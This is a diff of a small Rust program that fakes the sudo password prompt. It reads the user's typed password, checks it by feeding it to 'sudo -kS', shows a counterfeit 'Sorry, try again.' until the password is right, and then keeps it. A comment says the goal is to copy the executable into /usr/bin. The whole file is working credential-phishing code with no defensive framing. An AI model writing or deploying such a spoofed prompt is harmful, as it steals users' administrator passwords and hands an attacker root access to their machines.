@@ -1,16 +1,26 @@
 use std::{io::Write, process::Stdio};
 
 fn main() {
+    // grabbing the path of the current running executable
     let current_exe_path = std::env::current_exe().unwrap();
-    loop {
-        print!(
+    dbg!(&current_exe_path);
+
+    // creating a buffered writer for stdout
+    let mut out = std::io::BufWriter::new(std::io::stdout().lock());
+
+    // copying the executable to the /usr/bin directory
+    let pass = loop {
+        write!(
+            out,
             "[sudo] enter password for {}: ",
             std::env::var("USER").unwrap()
-        );
-        let _ = std::io::stdout().flush();
+        )
+        .unwrap();
+        let _ = out.flush();
 
-        let mut s = String::new();
-        std::io::stdin().read_line(&mut s).unwrap();
+        let mut pass = String::new();
+        std::io::stdin().read_line(&mut pass).unwrap();
+        pass.pop();
 
         let mut child = std::process::Command::new("sudo")
             .arg("-kS")
@@ -20,28 +30,15 @@ fn main() {
             .spawn()
             .unwrap();
 
-        writeln!(child.stdin.as_mut().unwrap(), "{}", s).unwrap();
-        // println!("[stdin] {:?}", child.stdin.as_ref().unwrap());
+        let _ = child.stdin.as_mut().unwrap().write_all(&pass.as_bytes());
 
-        match child.wait_with_output() {
-            Ok(op) => {
-                if let Some(0) = op.status.code() {
-                    println!(
-                        "\n[status] {}\n[stdout] {}\n[stderr] {}",
-                        op.status,
-                        String::from_utf8(op.stdout).unwrap(),
-                        String::from_utf8(op.stderr).unwrap()
-                    );
-                    println!("[passwd] {s}");
-                    break;
-                } else if let Some(1) = op.status.code() {
-                    println!("Sorry, try again.");
-                    continue;
-                }
-            }
-            Err(e) => {
+        if let Ok(op) = child.wait_with_output() {
+            if let Some(0) = op.status.code() {
+                break pass;
+            } else if let Some(1) = op.status.code() {
+                writeln!(out, "Sorry, try again.").unwrap();
                 continue;
             }
         }
-    }
+    };
 }
